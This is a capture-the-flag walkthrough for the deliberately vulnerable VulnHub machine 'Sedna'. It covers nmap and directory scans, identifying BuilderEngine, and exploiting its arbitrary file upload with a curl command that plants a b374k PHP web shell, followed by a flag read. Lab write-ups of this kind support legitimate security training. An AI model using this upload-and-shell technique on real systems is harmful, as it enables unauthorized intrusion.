# HackFest 2016: Sedna CTF Walkthrough
[VulnHub URL]
## Description:
```
Welcome to Sedna
This is a vulnerable machine i created for the Hackfest 2016 CTF http://hackfest.ca/
Difficulty : Medium
Tips:
There are multiple way to root this box, if it should work but doesn't try to gather more info about why its not working.
Goals: This machine is intended to be doable by someone who have some experience in doing machine on vulnhub
There are 4 flags on this machine One for a shell One for root access Two for doing post exploitation on Sedna
Feedback: This is my second vulnerable machine, please give me feedback on how to improve ! @ViperBlackSkull on Twitter simon.nolet@hotmail.com
Special Thanks to madmantm for testing this virtual machine
SHA-256 : 178306779A86965E0361AA20BA458C71F2C7AEB490F5FD8FAAFAEDAE18E0B0BA
```
## Contents:
	1. Initial scanning & recon.
	2. Exploiting BuilderEngine & shelling the system.
	3. Searching the system for flags.
## Initial scanning & recon
 - Nmap
 - Uniscan (probably best to use Dirb instead)

Nmap:
```
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 aa:c3:9e:80:b4:81:15:dd:60:d5:08:ba:3f:e0:af:08 (DSA)
|   2048 41:7f:c2:5d:d5:3a:68:e4:c5:d9:cc:60:06:76:93:a5 (RSA)
|_  256 ef:2d:65:85:f8:3a:85:c2:33:0b:7d:f9:c8:92:22:03 (ECDSA)
53/tcp    open  domain      ISC BIND 9.9.5-3-Ubuntu
| dns-nsid:
|_  bind.version: 9.9.5-3-Ubuntu
80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_Hackers
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
110/tcp   open  pop3        Dovecot pop3d
|_pop3-capabilities: SASL AUTH-RESP-CODE RESP-CODES STLS CAPA TOP PIPELINING UIDL
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2016-10-07T19:17:14
|_Not valid after:  2026-10-07T19:17:14
|_ssl-date: TLS randomness does not represent time
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          54863/udp  status
|_  100024  1          57224/tcp  status
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp   open  imap        Dovecot imapd (Ubuntu)
|_imap-capabilities: IDLE more LITERAL+ have LOGIN-REFERRALS LOGINDISABLEDA0001 Pre-login ID capabilities listed OK SASL-IR ENABLE IMAP4rev1 STARTTLS post-login
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2016-10-07T19:17:14
|_Not valid after:  2026-10-07T19:17:14
|_ssl-date: TLS randomness does not represent time
445/tcp   open  netbios-ssn Samba smbd 4.1.6-Ubuntu (workgroup: WORKGROUP)
993/tcp   open  ssl/imap    Dovecot imapd (Ubuntu)
|_imap-capabilities: IDLE AUTH=PLAINA0001 IMAP4rev1 more have LOGIN-REFERRALS ID capabilities listed Pre-login SASL-IR ENABLE OK LITERAL+ post-login
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2016-10-07T19:17:14
|_Not valid after:  2026-10-07T19:17:14
|_ssl-date: TLS randomness does not represent time
995/tcp   open  ssl/pop3    Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) AUTH-RESP-CODE RESP-CODES USER CAPA TOP PIPELINING UIDL
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2016-10-07T19:17:14
|_Not valid after:  2026-10-07T19:17:14
|_ssl-date: TLS randomness does not represent time
8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
| http-methods:
|_  Potentially risky methods: PUT DELETE
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat
57224/tcp open  status      1 (RPC #100024)
MAC Address: 08:00:27:DD:47:80 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.6
Network Distance: 1 hop
Service Info: Host: SEDNA; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 59m56s, deviation: 0s, median: 59m56s
|_nbstat: NetBIOS name: SEDNA, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Unix (Samba 4.1.6-Ubuntu)
|   NetBIOS computer name: SEDNA\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2017-03-27T17:11:37-04:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smbv2-enabled: Server supports SMBv2 protocol
```
Service-wise, this CTF was fairly similar to Quaoar.

However, something on the webserver was very different. 
Seeing as I'd completed these two challenges fairly quickly and in succession, I instantly disregarded the useless index page and the Hackers reference and went straight to /wordpress/; only to be met with a 404 error... 
As it turns out, WordPress is not present on Sedna.

I decided to run Uniscan (once again) to brute directories and give me something to work with, here's the useful output:
```
| Directory check:
| [+] CODE: 200 URL: http://192.168.56.101/blocks/
| [+] CODE: 200 URL: http://192.168.56.101/files/
| [+] CODE: 200 URL: http://192.168.56.101/modules/
| [+] CODE: 200 URL: http://192.168.56.101/system/
| [+] CODE: 200 URL: http://192.168.56.101/themes/

| File check:
| [+] CODE: 200 URL: http://192.168.56.101/index.html
| [+] CODE: 200 URL: http://192.168.56.101/license.txt
| [+] CODE: 200 URL: http://192.168.56.101/robots.txt
```

Looking back over the files Uniscan detected, I noticed that `license.txt` was different from the first challenge. Here's an excerpt from the file:
```
The MIT License (MIT)

Copyright (c) 2012 - 2015 BuilderEngine / Radian Enterprise Systems Limited.
```
BuilderEngine? That sounds promising. And once again, Uniscan had completely trolled me and failed to find `/builderengine/` in the initial scan.

## Exploiting BuilderEngine & shelling the system

So now I have a target, time to search for exploits.
"[BuilderEngine 3.5.0 - Arbitrary File Upload]" looks like the best option, it also shows the directory of the file uploader (which exists!)

So in order to upload files, a POST request needs to be made.

It was time to choose a payload and exploit BuilderEngine's file uploader located at `/themes/dashboard/assets/plugins/jquery-file-upload`.

I took a few minutes to fully understand how I was going to go about this, and decided to use this cURL command:
`curl --proxy http://127.0.0.1:8080 --form "files[]=@pwn.php" http://192.168.56.101/themes/dashboard/assets/plugins/jquery-file-upload/server/php/`

After `pwn.php` (a [b374k shell]) was uploaded, I could simply direct my browser to `/files/pwn.php` and it executes!

## Searching the system for flags

Strangely, I could already access `/root/` on the system...
```
/var/www/>cat flag.txt
bfbb7e6e6e88d9ae66848b9aeac6b289
```


[VulnHub URL]: <https://www.vulnhub.com/entry/hackfest2016-sedna,181/>
[BuilderEngine 3.5.0 - Arbitrary File Upload]: <https://www.exploit-db.com/exploits/40390>
[b374k shell]: <https://github.com/kieran-walker-0/b374k>
